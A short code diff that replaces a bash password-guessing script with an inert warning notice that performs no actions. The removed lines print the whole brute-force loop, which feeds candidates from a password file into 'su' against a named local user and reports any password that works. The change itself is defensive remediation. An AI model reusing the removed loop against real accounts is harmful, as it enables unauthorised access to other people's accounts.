@@ -1,21 +1,8 @@
-#!/bin/bash
-USER="jmartinez"
-PASSWORD_FILE="passwords.txt"
+#!/usr/bin/env bash
+set -euo pipefail
 
-if [[ ! -f "${PASSWORD_FILE}" ]]; then
-  echo "password file does not exist."
-  exit 1
-fi
-
-while read -r password; do
-  echo "Attempting password: ${password} against ${USER}..."
-  if echo "${password}" | timeout 0.2 su - ${USER} -c 'whoami' | grep -q "${USER}"; then
-    echo
-    echo "SUCCESS! The password for ${USER} is ${password}"
-    echo "Use su - ${USER} and provide the password to switch"
-    exit 0
-  fi
-done < "${PASSWORD_FILE}"
-
-echo "Unable to compromise ${USER}."
-exit 1
+cat >&2 <<'NOTICE'
+Password guessing exposed candidate and valid account passwords. Use approved identity-provider controls and authentication logs.
+This path is retained as an inert notice and performs no actions.
+NOTICE
+exit 2
